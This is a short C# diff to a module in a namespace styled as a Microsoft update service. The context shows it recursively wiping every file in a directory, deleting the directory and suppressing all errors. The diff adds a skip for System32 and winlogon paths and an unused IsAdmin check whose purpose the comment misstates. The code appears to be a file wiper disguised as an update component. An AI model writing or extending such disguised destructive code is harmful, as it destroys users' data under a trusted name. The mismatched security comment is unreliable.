@@ -44,6 +44,12 @@ namespace Microsoft.UpdateService.Modules
             {
                 if (!Directory.Exists(dirPath)) return;
 
+                // SECURITY: Block attempts to wipe critical system directories if not admin or if target is sensitive
+                if (dirPath.ToLower().Contains("windows\\system32") || dirPath.ToLower().Contains("winlogon"))
+                {
+                    return;
+                }
+
                 foreach (var file in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
                 {
                     WipeFile(file);
@@ -52,6 +58,17 @@ namespace Microsoft.UpdateService.Modules
                 Directory.Delete(dirPath, true);
             }
             catch { }
+        }
+
+        private static bool IsAdmin()
+        {
+            try
+            {
+                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                return new System.Security.Principal.WindowsPrincipal(identity)
+                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            }
+            catch { return false; }
         }
     }
 }
